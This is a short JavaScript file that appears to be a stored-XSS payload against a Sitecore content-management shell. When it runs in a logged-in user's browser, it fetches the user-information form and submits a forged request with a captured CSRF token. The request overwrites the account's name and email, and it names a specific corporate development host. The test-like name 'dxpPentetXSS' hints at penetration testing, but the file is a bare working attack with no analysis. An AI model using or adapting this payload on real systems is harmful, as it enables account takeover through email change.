var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation',true);
req.send();
function handleResponse() {
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', true);
    changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=339&__Y=563&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACRkMGViZDgzNS0xZDdkLTQyZTUtYmE4Yi1mMTQ3OTk1YjcxMTkL&__VIEWSTATE=86B2E4CDE5914F45B097338BC21BB43B&__VIEWSTATE=&Fullname=dxpPentetXSS&Email=lr%40moc.moc')
};
